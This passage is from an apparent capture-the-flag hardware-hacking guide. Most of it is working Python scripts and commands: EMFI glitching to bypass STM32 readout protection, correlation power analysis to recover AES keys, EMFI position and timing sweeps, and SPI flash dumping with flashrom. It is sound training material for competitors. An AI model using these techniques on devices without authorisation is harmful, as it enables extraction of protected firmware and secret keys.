        # This requires external reset control
        # Or manual reset button timing
        
        # Fire EMFI pulse
        self.fc.write(b'P')
        time.sleep(0.2)
    
    def interactive_attack(self):
        """
        Interactive mode - manually reset target while script fires EMFI
        """
        print("[*] EMFI RDP Bypass - Interactive Mode")
        print("[*] Position EMFI coil over STM32")
        print("[*] Press Enter, then quickly press reset on target")
        print("[*] EMFI will fire after brief delay")
        print("[*] Script will check if RDP was bypassed")
        print("[*] Press Ctrl+C to stop")
        
        delays = [5, 10, 15, 20, 25, 30, 40, 50]  # ms
        delay_idx = 0
        
        try:
            while True:
                input("\n[Press Enter then reset target]")
                
                delay = delays[delay_idx % len(delays)]
                print(f"[*] Waiting {delay}ms then firing EMFI...")
                
                time.sleep(delay / 1000.0)
                self.fc.write(b'P')
                
                time.sleep(0.1)
                
                # Check if RDP was bypassed
                if self.check_rdp_status():
                    print("[SUCCESS!] RDP appears to be bypassed!")
                    print("[*] Try dumping flash now with OpenOCD")
                    break
                
                print(f"[*] No bypass detected. Trying next delay...")
                delay_idx += 1
        
        except KeyboardInterrupt:
            print("\n[*] Stopped")
    
    def check_rdp_status(self):
        """Quick check if we can connect via SWD"""
        try:
            result = subprocess.run(
                ['openocd', '-f', 'interface/stlink.cfg', 
                 '-f', 'target/stm32f1x.cfg',
                 '-c', 'init', '-c', 'shutdown'],
                capture_output=True,
                timeout=3,
                text=True
            )
            return 'protected' not in result.stderr.lower()
        except:
            return False


def main():
    attack = RDPEMFI()
    attack.interactive_attack()


if __name__ == '__main__':
    main()
```

---

## Challenge 3: Side-Channel Attack - Power Analysis {#challenge-3}

### Objective
Extract a secret key using power analysis (DPA/SPA).

### Tools Used
- **Curious Bolt**: 35MSPS differential power scope for trace capture
- **Bus Pirate**: Send inputs/triggers to target

---

### Power Analysis Theory

```
┌─────────────────────────────────────────────────────────────┐
│ Power Analysis Basics                                       │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│ When a CPU processes data, power consumption varies:        │
│                                                             │
│   Processing 0x00: ▁▁▁▂▁▁▁  (fewer bit flips)              │
│   Processing 0xFF: ▁▃▅▇▅▃▁  (more bit flips)               │
│                                                             │
│ This leaks information about the data being processed!      │
│                                                             │
│ Attack Types:                                               │
│                                                             │
│ SPA (Simple Power Analysis):                                │
│   - Look at single trace                                    │
│   - Identify operations by visual patterns                  │
│   - Works when operations are data-dependent                │
│                                                             │
│ DPA (Differential Power Analysis):                          │
│   - Collect MANY traces with known inputs                   │
│   - Statistically correlate power with intermediate values  │
│   - Recover key byte-by-byte                               │
│                                                             │
│ CPA (Correlation Power Analysis):                           │
│   - Improved DPA using Pearson correlation                  │
│   - Most effective against modern crypto                    │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### Wiring for Power Analysis

```
┌─────────────────────────────────────────────────────────────┐
│ Power Analysis Setup                                        │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  Curious Bolt          Target          Bus Pirate           │
│  ────────────          ──────          ──────────           │
│  GND (ADC)    ──┬───── GND ──────────  GND                 │
│  GND (ADC)    ──┘                                          │
│  ADC          ──────── VMCU (close to chip!)               │
│  CH0 (trigger)──────── TX ───────────  MISO (RX)           │
│                        RX ───────────  MOSI (TX)           │
│                                                             │
│  IMPORTANT: Connect BOTH GND pins near ADC input           │
│  IMPORTANT: ADC probe as close to MCU as possible          │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### Phase 1: Capture Power Traces

```python
#!/usr/bin/env python3
# ch3_capture_traces.py
"""
Challenge 3: Power Trace Capture
Using Curious Bolt scope + Bus Pirate for communication
"""

import serial
import time
import numpy as np
from scope import Scope

class PowerTraceCapture:
    def __init__(self, uart_port='/dev/ttyUSB0'):
        self.bolt = Scope()
        self.uart = serial.Serial(uart_port, 115200, timeout=1)
        print("[*] Bolt scope and UART connected")
    
    def capture_single(self, input_data):
        """
        Send input and capture power trace during processing
        """
        # Arm scope to trigger on response (TX activity)
        self.bolt.arm(0, Scope.FALLING_EDGE)
        
        # Send input
        self.uart.write(input_data)
        self.uart.flush()
        
        # Wait for capture
        time.sleep(0.1)
        
        # Get trace
        trace = np.array(self.bolt.get_last_trace())
        
        # Read response (to clear buffer)
        response = self.uart.read(100)
        
        return trace, response
    
    def capture_dataset(self, num_traces=1000, input_size=16):
        """
        Capture many traces with random inputs
        """
        traces = []
        inputs = []
        
        print(f"[*] Capturing {num_traces} traces...")
        
        for i in range(num_traces):
            # Random input (plaintext for crypto)
            input_data = np.random.randint(0, 256, input_size, dtype=np.uint8)
            
            trace, _ = self.capture_single(bytes(input_data))
            
            traces.append(trace)
            inputs.append(input_data)
            
            if (i + 1) % 100 == 0:
                print(f"[*] Captured {i + 1}/{num_traces}")
        
        # Convert to numpy arrays
        traces = np.array(traces)
        inputs = np.array(inputs)
        
        # Save
        np.save('traces.npy', traces)
        np.save('inputs.npy', inputs)
        
        print(f"[*] Saved {num_traces} traces to traces.npy")
        print(f"[*] Trace length: {traces.shape[1]} samples")
        
        return traces, inputs
    
    def visualize_traces(self, num_display=10):
        """
        Plot some traces to verify quality
        """
        import matplotlib.pyplot as plt
        
        traces = np.load('traces.npy')
        
        plt.figure(figsize=(15, 8))
        
        # Plot overlay
        plt.subplot(2, 1, 1)
        for i in range(min(num_display, len(traces))):
            plt.plot(traces[i], alpha=0.5)
        plt.title('Power Traces Overlay')
        plt.xlabel('Sample')
        plt.ylabel('Power (mV)')
        
        # Plot mean trace
        plt.subplot(2, 1, 2)
        mean_trace = np.mean(traces, axis=0)
        plt.plot(mean_trace)
        plt.title('Mean Power Trace')
        plt.xlabel('Sample')
        plt.ylabel('Power (mV)')
        
        plt.tight_layout()
        plt.savefig('traces_visualization.png')
        plt.show()
        
        print("[*] Saved visualization to traces_visualization.png")


def main():
    capture = PowerTraceCapture()
    
    # Capture dataset
    capture.capture_dataset(num_traces=1000)
    
    # Visualize
    capture.visualize_traces()


if __name__ == '__main__':
    main()
```

### Phase 2: DPA/CPA Attack

```python
#!/usr/bin/env python3
# ch3_dpa_attack.py
"""
Challenge 3: Differential Power Analysis Attack
Recover AES key using correlation power analysis
"""

import numpy as np
import matplotlib.pyplot as plt

# AES S-box (for CPA)
SBOX = [
    0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, 0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76,
    0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0, 0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0,
    0xb7, 0xfd, 0x93, 0x26, 0x36, 0x3f, 0xf7, 0xcc, 0x34, 0xa5, 0xe5, 0xf1, 0x71, 0xd8, 0x31, 0x15,
    0x04, 0xc7, 0x23, 0xc3, 0x18, 0x96, 0x05, 0x9a, 0x07, 0x12, 0x80, 0xe2, 0xeb, 0x27, 0xb2, 0x75,
    0x09, 0x83, 0x2c, 0x1a, 0x1b, 0x6e, 0x5a, 0xa0, 0x52, 0x3b, 0xd6, 0xb3, 0x29, 0xe3, 0x2f, 0x84,
    0x53, 0xd1, 0x00, 0xed, 0x20, 0xfc, 0xb1, 0x5b, 0x6a, 0xcb, 0xbe, 0x39, 0x4a, 0x4c, 0x58, 0xcf,
    0xd0, 0xef, 0xaa, 0xfb, 0x43, 0x4d, 0x33, 0x85, 0x45, 0xf9, 0x02, 0x7f, 0x50, 0x3c, 0x9f, 0xa8,
    0x51, 0xa3, 0x40, 0x8f, 0x92, 0x9d, 0x38, 0xf5, 0xbc, 0xb6, 0xda, 0x21, 0x10, 0xff, 0xf3, 0xd2,
    0xcd, 0x0c, 0x13, 0xec, 0x5f, 0x97, 0x44, 0x17, 0xc4, 0xa7, 0x7e, 0x3d, 0x64, 0x5d, 0x19, 0x73,
    0x60, 0x81, 0x4f, 0xdc, 0x22, 0x2a, 0x90, 0x88, 0x46, 0xee, 0xb8, 0x14, 0xde, 0x5e, 0x0b, 0xdb,
    0xe0, 0x32, 0x3a, 0x0a, 0x49, 0x06, 0x24, 0x5c, 0xc2, 0xd3, 0xac, 0x62, 0x91, 0x95, 0xe4, 0x79,
    0xe7, 0xc8, 0x37, 0x6d, 0x8d, 0xd5, 0x4e, 0xa9, 0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x08,
    0xba, 0x78, 0x25, 0x2e, 0x1c, 0xa6, 0xb4, 0xc6, 0xe8, 0xdd, 0x74, 0x1f, 0x4b, 0xbd, 0x8b, 0x8a,
    0x70, 0x3e, 0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e, 0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e,
    0xe1, 0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94, 0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf,
    0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68, 0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16
]

def hamming_weight(x):
    """Count number of 1 bits"""
    return bin(x).count('1')

def correlate(x, y):
    """Pearson correlation coefficient"""
    x = np.array(x, dtype=float)
    y = np.array(y, dtype=float)
    
    x_mean = np.mean(x)
    y_mean = np.mean(y)
    
    numerator = np.sum((x - x_mean) * (y - y_mean))
    denominator = np.sqrt(np.sum((x - x_mean)**2) * np.sum((y - y_mean)**2))
    
    if denominator == 0:
        return 0
    
    return numerator / denominator

class CPAAttack:
    def __init__(self, traces_file='traces.npy', inputs_file='inputs.npy'):
        self.traces = np.load(traces_file)
        self.inputs = np.load(inputs_file)
        
        self.num_traces = len(self.traces)
        self.trace_len = len(self.traces[0])
        
        print(f"[*] Loaded {self.num_traces} traces, {self.trace_len} samples each")
    
    def attack_byte(self, byte_index):
        """
        Attack single key byte using CPA
        Returns: (recovered_byte, correlation_scores)
        """
        print(f"[*] Attacking byte {byte_index}...")
        
        correlations = np.zeros(256)
        correlation_traces = np.zeros((256, self.trace_len))
        
        for key_guess in range(256):
            # Compute hypothetical intermediate values
            hypothetical = np.zeros(self.num_traces)
            
            for i in range(self.num_traces):
                # For AES: intermediate = Sbox(plaintext XOR key)
                intermediate = SBOX[self.inputs[i][byte_index] ^ key_guess]
                hypothetical[i] = hamming_weight(intermediate)
            
            # Correlate with each time sample
            for sample in range(self.trace_len):
                correlation_traces[key_guess][sample] = correlate(
                    hypothetical, 
                    self.traces[:, sample]
                )
            
            # Peak correlation for this key guess
            correlations[key_guess] = np.max(np.abs(correlation_traces[key_guess]))
        
        # Best key is highest correlation
        best_key = np.argmax(correlations)
        
        print(f"    Byte {byte_index}: 0x{best_key:02x} (corr: {correlations[best_key]:.4f})")
        
        return best_key, correlations, correlation_traces[best_key]
    
    def attack_full_key(self, key_bytes=16):
        """
        Recover full key
        """
        print("[*] Starting full key recovery...")
        
        recovered_key = []
        
        fig, axes = plt.subplots(4, 4, figsize=(16, 12))
        
        for byte_idx in range(key_bytes):
            key_byte, correlations, corr_trace = self.attack_byte(byte_idx)
            recovered_key.append(key_byte)
            
            # Plot correlation trace
            ax = axes[byte_idx // 4][byte_idx % 4]
            ax.plot(corr_trace)
            ax.set_title(f'Byte {byte_idx}: 0x{key_byte:02x}')
            ax.set_xlabel('Sample')
            ax.set_ylabel('Correlation')
        
        plt.tight_layout()
        plt.savefig('cpa_attack_results.png')
        plt.show()
        
        # Format key
        key_hex = ''.join(f'{b:02x}' for b in recovered_key)
        key_ascii = ''.join(chr(b) if 32 <= b < 127 else '.' for b in recovered_key)
        
        print(f"\n{'='*60}")
        print(f"[SUCCESS] Recovered Key:")
        print(f"  Hex:   {key_hex}")
        print(f"  ASCII: {key_ascii}")
        print(f"{'='*60}")
        
        return recovered_key
    
    def verify_key(self, key):
        """
        Verify recovered key by sending to target
        """
        # Implementation depends on challenge format
        pass


def main():
    attack = CPAAttack()
    key = attack.attack_full_key()


if __name__ == '__main__':
    main()
```

### Phase 3: Simple Power Analysis (Visual)

For some challenges, you might spot the key just by looking:

```python
#!/usr/bin/env python3
# ch3_spa_visual.py
"""
Simple Power Analysis - Visual Inspection
Sometimes you can see data-dependent patterns directly
"""

import numpy as np
import matplotlib.pyplot as plt

def spa_analysis():
    traces = np.load('traces.npy')
    inputs = np.load('inputs.npy')
    
    # Group traces by input byte value
    fig, axes = plt.subplots(4, 4, figsize=(16, 12))
    
    for bit in range(8):
        ax = axes[bit // 4][bit % 4]
        
        # Separate traces by whether bit is set
        bit_set = []
        bit_clear = []
        
        for i, inp in enumerate(inputs):
            if (inp[0] >> bit) & 1:
                bit_set.append(traces[i])
            else:
                bit_clear.append(traces[i])
        
        # Plot mean of each group
        ax.plot(np.mean(bit_set, axis=0), label='Bit set', alpha=0.7)
        ax.plot(np.mean(bit_clear, axis=0), label='Bit clear', alpha=0.7)
        ax.set_title(f'Input Byte 0, Bit {bit}')
        ax.legend()
    
    plt.tight_layout()
    plt.savefig('spa_bit_analysis.png')
    plt.show()
    
    # Look for areas where traces diverge - that's where data is processed!


if __name__ == '__main__':
    spa_analysis()
```

---

## Challenge 4: Advanced Glitching - Multi-Target & EMFI {#challenge-4}

### Objective
Combine multiple attack techniques to bypass advanced protections.

### Tools Used
- **Faulty Cat**: EMFI attacks (primary for this challenge)
- **Curious Bolt**: Voltage glitching + power analysis for timing
- **Bus Pirate**: Communication with target

---

### Why EMFI for Challenge 4?

Challenge 4 likely has:
- Better power filtering (harder to voltage glitch)
- Multiple security checks (need different attack points)
- Physical tampering detection (non-contact attack needed)

EMFI advantages:
- No physical connection to power rails
- Can target specific chip areas
- Works through some encapsulation

---

### EMFI Attack Methodology

```
┌─────────────────────────────────────────────────────────────┐
│ EMFI Attack Process                                         │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│ 1. POSITION MAPPING                                         │
│    - Create XY grid over chip                               │
│    - Fire EMFI at each position                             │
│    - Record which positions cause effects                   │
│                                                             │
│ 2. TIMING SEARCH                                            │
│    - Use power analysis to find security check timing       │
│    - Start with boot-time attacks                           │
│    - Try command-response timing                            │
│                                                             │
│ 3. COMBINED ATTACK                                          │
│    - Best position + best timing                            │
│    - May need multiple pulses                               │
│    - Automate for repeatability                             │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### Phase 1: Find Timing with Curious Bolt Power Analysis

```python
#!/usr/bin/env python3
# ch4_find_timing.py
"""
Challenge 4: Find attack timing windows using power analysis
"""

import numpy as np
import matplotlib.pyplot as plt
from scope import Scope
import time

def capture_boot_signature():
    """
    Capture power during boot to find security check timing
    """
    bolt = Scope()
    
    # Configure for boot capture
    # Trigger on reset release
    
    # Hold reset
    bolt.io.set(0, False)
    time.sleep(0.1)
    
    # Arm scope
    bolt.arm(0, Scope.RISING_EDGE)
    
    # Release reset
    bolt.io.set(0, True)
    
    # Wait for capture
    time.sleep(0.1)
    
    # Get trace
    trace = bolt.get_last_trace()
    
    # Plot with annotations
    plt.figure(figsize=(15, 6))
    plt.plot(trace)
    plt.title('Boot Power Signature - Look for Security Checks')
    plt.xlabel('Sample (35MSPS → ~28.5ns per sample)')
    plt.ylabel('Power')
    
    # Add time markers
    samples_per_us = 35  # 35MSPS
    for us in [10, 20, 30, 40, 50, 100]:
        sample = us * samples_per_us
        if sample < len(trace):
            plt.axvline(x=sample, color='r', linestyle='--', alpha=0.5)
            plt.text(sample, max(trace), f'{us}µs', rotation=90)
    
    plt.savefig('ch4_boot_signature.png')
    plt.show()
    
    return trace


def identify_security_checks(trace):
    """
    Look for patterns indicating security checks:
    - Sharp power spikes (crypto operations)
    - Repeated patterns (loop comparisons)
    - Sudden drops (decision points)
    """
    # Derivative shows changes
    derivative = np.diff(trace)
    
    # Find significant changes
    threshold = np.std(derivative) * 3
    significant = np.where(np.abs(derivative) > threshold)[0]
    
    print("[*] Significant power changes at samples:")
    for s in significant[:20]:  # First 20
        time_us = s / 35
        print(f"    Sample {s} ({time_us:.1f}µs)")
    
    return significant


if __name__ == '__main__':
    trace = capture_boot_signature()
    identify_security_checks(trace)
```

### Phase 2: EMFI Position Mapping with Faulty Cat

```python
#!/usr/bin/env python3
# ch4_emfi_mapping.py
"""
Challenge 4: Map EMFI sensitive positions on chip
Manual process - move probe, record results
"""

import serial
import time

class EMFIMapper:
    def __init__(self, fc_port='/dev/ttyACM1', uart_port='/dev/ttyUSB0'):
        self.fc = serial.Serial(fc_port, 115200, timeout=1)
        self.uart = serial.Serial(uart_port, 115200, timeout=1)
        time.sleep(2)
        
        self.positions = []
        self.results = []
    
    def test_position(self, position_name, delay_ms=10):
        """
        Test current EMFI coil position
        """
        print(f"\n[*] Testing position: {position_name}")
        print(f"[*] Firing EMFI in {delay_ms}ms...")
        
        # Clear UART
        self.uart.reset_input_buffer()
        
        # Send command to trigger operation
        self.uart.write(b'TEST\r\n')
        
        # Wait then fire EMFI
        time.sleep(delay_ms / 1000.0)
        self.fc.write(b'P')
        
        # Wait for response
        time.sleep(0.5)
        response = self.uart.read(500).decode('utf-8', errors='ignore')
        
        # Categorize result
        if 'flag' in response.lower() or 'success' in response.lower():
            result = 'SUCCESS'
        elif 'error' in response.lower() or 'fault' in response.lower():
            result = 'FAULT'
        elif 'denied' in response.lower() or 'fail' in response.lower():
            result = 'NORMAL'
        elif len(response) == 0:
            result = 'CRASH'
        else:
            result = 'UNKNOWN'
        
        print(f"    Result: {result}")
        print(f"    Response: {response[:100]}")
        
        self.positions.append(position_name)
        self.results.append(result)
        
        return result
    
    def interactive_mapping(self):
        """
        Interactive position testing
        """
        print("[*] EMFI Position Mapping")
        print("[*] Move coil to position, enter name, press Enter")
        print("[*] Type 'done' to finish, 'summary' to see results")
        
        while True:
            position = input("\nPosition name (or 'done'/'summary'): ").strip()
            
            if position.lower() == 'done':
                break
            elif position.lower() == 'summary':
                self.print_summary()
                continue
            
            delay = input("Delay in ms [10]: ").strip()
            delay = int(delay) if delay else 10
            
            self.test_position(position, delay)
        
        self.print_summary()
    
    def print_summary(self):
        """
        Print mapping summary
        """
        print("\n" + "="*60)
        print("EMFI Position Mapping Summary")
        print("="*60)
        
        for pos, res in zip(self.positions, self.results):
            marker = '★' if res == 'SUCCESS' else '⚠' if res == 'FAULT' else '·'
            print(f"  {marker} {pos}: {res}")
        
        # Highlight promising positions
        faults = [p for p, r in zip(self.positions, self.results) if r in ['FAULT', 'CRASH']]
        if faults:
            print(f"\n[!] Promising positions (caused faults): {faults}")


def main():
    mapper = EMFIMapper()
    mapper.interactive_mapping()


if __name__ == '__main__':
    main()
```

### Phase 3: Combined Attack

```python
#!/usr/bin/env python3
# ch4_combined_attack.py
"""
Challenge 4: Combined EMFI + Timing Attack
Use discovered position and timing for automated attack
"""

import serial
import time

class CombinedAttack:
    def __init__(self, fc_port='/dev/ttyACM1', uart_port='/dev/ttyUSB0'):
        self.fc = serial.Serial(fc_port, 115200, timeout=1)
        self.uart = serial.Serial(uart_port, 115200, timeout=2)
        time.sleep(2)
    
    def single_attempt(self, delay_us, command=b'AUTH\r\n'):
        """
        Single attack attempt
        """
        self.uart.reset_input_buffer()
        
        # Send command
        self.uart.write(command)
        
        # Precise delay (microseconds)
        time.sleep(delay_us / 1_000_000.0)
        
        # Fire EMFI
        self.fc.write(b'P')
        
        # Get response
        time.sleep(0.3)
        return self.uart.read(1000).decode('utf-8', errors='ignore')
    
    def sweep_attack(self, delay_start_us=100, delay_end_us=50000, step_us=500):
        """
        Sweep through timing range
        """
        print(f"[*] EMFI timing sweep: {delay_start_us}-{delay_end_us}µs")
        
        for delay in range(delay_start_us, delay_end_us, step_us):
            response = self.single_attempt(delay)
            
            if 'flag' in response.lower() or 'ECSC' in response:
                print(f"\n{'='*60}")
                print(f"[SUCCESS!] Flag found at delay {delay}µs")
                print(response)
                print(f"{'='*60}")
                return True
            
            if 'denied' not in response.lower() and len(response) > 0:
                print(f"[?] Interesting at {delay}µs: {response[:50]}")
        
        return False
    
    def multi_pulse_attack(self, delays_us, command=b'AUTH\r\n'):
        """
        Fire multiple EMFI pulses at different timings
        Useful for bypassing multiple checks
        """
        self.uart.reset_input_buffer()
        
        # Send command
        start_time = time.time()
        self.uart.write(command)
        
        # Fire pulses at specified delays
        for delay in sorted(delays_us):
            # Wait until delay time
            while (time.time() - start_time) * 1_000_000 < delay:
                pass
            
            self.fc.write(b'P')
            time.sleep(0.1)  # Recovery between pulses
        
        # Get response
        time.sleep(0.5)
        return self.uart.read(1000).decode('utf-8', errors='ignore')


def main():
    attack = CombinedAttack()
    
    # Try single-pulse sweep first
    if not attack.sweep_attack():
        # Try multi-pulse attack
        print("\n[*] Trying multi-pulse attack...")
        
        # Common patterns: two checks at different times
        pulse_patterns = [
            [1000, 10000],      # Early + mid boot
            [5000, 20000],      # Two auth checks
            [1000, 5000, 10000] # Three checks
        ]
        
        for pattern in pulse_patterns:
            response = attack.multi_pulse_attack(pattern)
            if 'flag' in response.lower():
                print(f"[SUCCESS!] Multi-pulse worked: {pattern}µs")
                print(response)
                break


if __name__ == '__main__':
    main()
```

---

## Bonus: Alternative Attack Methods {#bonus}

### Using Shikra for Direct Flash Dump

If there's external SPI flash, bypass the MCU entirely:

```bash
# Check for external flash chip on target board
# Common chips: W25Q32, W25Q64, W25Q128, MX25L, etc.

# Wiring:
# Shikra CH0 (SK)  → Flash CLK
# Shikra CH1 (DO)  → Flash SO/MISO
# Shikra CH2 (DI)  → Flash SI/MOSI
# Shikra CH3 (CS)  → Flash CS#
# Shikra GND       → GND
# DON'T connect VCC - use target's power

# Identify chip
flashrom -p ft2232_spi:type=232H

# Dump
flashrom -p ft2232_spi:type=232H -r flash_dump.bin

# Analyze
binwalk -Me flash_dump.bin
strings flash_dump.bin | grep -iE "flag|ecsc|password|key"
```

### Using Bus Pirate for Protocol Sniffing

Capture communication between chips:

```bash
# Configure Bus Pirate as logic analyzer / sniffer
# Can decode SPI, I2C, UART between MCU and peripherals

# In Bus Pirate terminal:
m    # Mode
1    # UART (or SPI/I2C)
# Configure speed
# Use macro to sniff traffic
```

### Combining All Tools

For the most complex challenges:

```
┌─────────────────────────────────────────────────────────────┐
│ Multi-Tool Attack Flow                                      │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│ 1. RECON (Bus Pirate)                                       │
│    └── Identify protocols, find baud rates, map pins        │
│                                                             │
│ 2. TIMING ANALYSIS (Curious Bolt)                           │
│    └── Capture power traces, find security check windows    │
│                                                             │
│ 3. PIN DETECTION (Faulty Cat)                               │
│    └── Find SWD/JTAG if not labeled                        │
│                                                             │
│ 4. ATTACK ATTEMPTS                                          │
│    ├── Voltage Glitch (Curious Bolt) - precise, reliable    │
│    ├── EMFI (Faulty Cat) - non-invasive, position-sensitive │
│    └── Direct Dump (Shikra) - if external flash exists      │
│                                                             │
│ 5. EXTRACTION                                               │
│    └── Once bypass achieved, dump via SWD or Shikra         │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

---

## Troubleshooting {#troubleshooting}

### Tool-Specific Issues

#### Curious Bolt

| Issue | Solution |
|-------|----------|
| Not detected | Check USB, try different port, verify udev rules |
| Glitch not firing | Verify wiring, check trigger source |
| No power traces | Verify ADC wiring, both GND pins connected |

#### Bus Pirate

| Issue | Solution |
|-------|----------|
| Garbled output | Wrong baud rate, try common values |
| No response | Check TX/RX not swapped |
| Mode errors | Power cycle Bus Pirate, reset with '#' |

#### Faulty Cat

| Issue | Solution |
|-------|----------|
| No effect | Move coil closer (1-3mm), try different position |
| Target crashes | Reduce pulse power, increase recovery time |
| Won't connect | Check Arduino port, may need driver |

#### Shikra

| Issue | Solution |
|-------|----------|
| Chip not detected | Verify wiring, check chip is powered |
| Read errors | Slow down speed, check connections |
| Wrong chip ID | Use -c to force chip type |

### General Tips

1. **Start simple**: Use one tool first, add complexity
2. **Document everything**: Parameters, positions, results
3. **Power cycle often**: Targets can get into bad states
4. **Check connections**: Most issues are wiring problems
5. **Be patient**: Hardware hacking is iterative

---

## Additional Resources {#resources}

### Documentation

- [Curious Bolt Docs](https://bolt.curious.supplies/docs/)
- [Bus Pirate Manual](http://dangerousprototypes.com/docs/Bus_Pirate)
- [Faulty Cat Guide](https://github.com/ElectronicCats/faultycat)
- [Shikra/Flashrom](https://flashrom.org/Flashrom)

### Papers & Writeups

- "Shaping the Glitch" - TCHES 2019
- [SEC Consult STM32 Glitching](https://sec-consult.com/blog/detail/secglitcher-part-1-reproducible-voltage-glitching-on-stm32-microcontrollers/)
- [Trezor Wallet Glitch](https://www.youtube.com/watch?v=dT9y-KQbqi4)

### Community

- [NewAE Forum](https://forum.newae.com/)
- [/r/hardwarehacking](https://reddit.com/r/hardwarehacking)
- [HardwareHacking Discord](https://discord.gg/hardwarehacking)

---

## Quick Reference Card

```
┌─────────────────────────────────────────────────────────────┐
│ ECSC23 Challenge Quick Reference                            │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│ CHALLENGE 1 (UART Bypass):                                  │
│   Primary: Bus Pirate (UART) + Curious Bolt (glitch)        │
│   Alt: Faulty Cat EMFI                                      │
│   Target: Password strcmp or branch                         │
│                                                             │
│ CHALLENGE 2 (RDP Bypass):                                   │
│   Primary: Curious Bolt (boot-time glitch)                  │
│   Alt: Faulty Cat EMFI, Bootloader glitch                   │
│   Target: RDP option byte read                              │
│   Extract: Shikra (ext flash) or OpenOCD (SWD)              │
│                                                             │
│ CHALLENGE 3 (Power Analysis):                               │
│   Primary: Curious Bolt (scope)                             │
│   Support: Bus Pirate (comms)                               │
│   Technique: CPA/DPA on crypto operations                   │
│                                                             │
│ CHALLENGE 4 (Advanced):                                     │
│   Primary: Faulty Cat EMFI                                  │
│   Support: Curious Bolt (timing analysis)                   │
│   Technique: Position mapping + timing sweep                │
│                                                             │
├─────────────────────────────────────────────────────────────┤
│ TIMING QUICK REF:                                           │
│   Curious Bolt: 1 unit = 8.3ns, 1µs ≈ 120 units             │
│   Faulty Cat: ms-level timing, position-sensitive           │
│   Boot RDP check: 5-50µs after reset                        │
│   Bootloader RDP check: 15-20ms after command               │
│                                                             │
├─────────────────────────────────────────────────────────────┤
│ CRITICAL NOTES:                                             │
│   ST-Link is REQUIRED for STM32 flash extraction            │
│   Bus Pirate/Curious Bolt CANNOT do SWD/JTAG debugging      │
│   Faulty Cat can DETECT pins but not USE them               │
│   Shikra is for external SPI flash only, not MCU internal   │
│                                                             │
│ EMERGENCY COMMANDS:                                         │
│   Reset Bus Pirate: '#' then enter                          │
│   ST-Link test: st-info --probe                             │
│   Force chip: flashrom -c <chip_name>                       │
│   OpenOCD halt: telnet localhost 4444, 'reset halt'         │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

---

**Good luck with the challenges!**

*Document version: 2.0 - Multi-Tool Edition - January 2026*
